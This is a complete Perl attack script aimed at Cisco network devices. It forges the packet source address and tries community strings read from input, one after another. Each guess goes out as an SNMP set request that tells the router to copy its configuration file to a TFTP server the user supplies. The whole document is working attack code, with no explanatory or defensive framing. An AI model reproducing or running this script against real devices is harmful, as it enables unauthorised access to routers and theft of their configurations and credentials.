#!/usr/bin/perl -w

use strict;
use Net::SNMP;
use Data::Dumper;
use Getopt::Std;
use Net::RawIP;

sub usage() { printf STDERR "Usage: $0 -s srcipaddr [-S srcport] -d dstipaddr [-D dstport] -t tftpsipaddr -f cfgfilename\n"; exit(1); };

my %opts;
getopts('s:d:t:f:S:D:', \%opts);

my $sport = $opts{'S'} || 161;
my $dstip = $opts{'d'} || usage();
my $dport = $opts{'D'} || 161;
my $srcip = $opts{'s'} || usage();
my $tftpserver = $opts{'t'} || usage();
my $filename = $opts{'f'} || usage();

my $security = new Net::SNMP::Security();
my $transport = new Net::SNMP::Transport(-domain => 'udp4');
my $pdu = new Net::SNMP::PDU(-security => $security, -transport => $transport, -requestid => 0x12345678);
my $packet = new Net::RawIP({ ip => {tos => 0, saddr => $srcip, daddr => $dstip, protocol => 17}, udp => {source => $sport, dest => $dport}});

while(<>) {
	chomp;
	$security->_community($_);
	#$pdu->_create_request_id();
	$pdu->prepare_set_request([".1.3.6.1.4.1.9.2.1.55.$tftpserver", OCTET_STRING, $filename]);

	my ($msg, $error) = Net::SNMP::Message->new(
		-callback   => $pdu->callback,
		-leadingdot => $pdu->leading_dot,
		-requestid  => $pdu->request_id,
		-security   => $pdu->security,
		-translate  => $pdu->translate,
		-transport  => $pdu->transport,
		-version    => $pdu->version
	);
	$security->generate_request_msg($pdu, $msg);
	$packet->set({udp => {data => $msg->{_buffer}}});
	$packet->send();
}

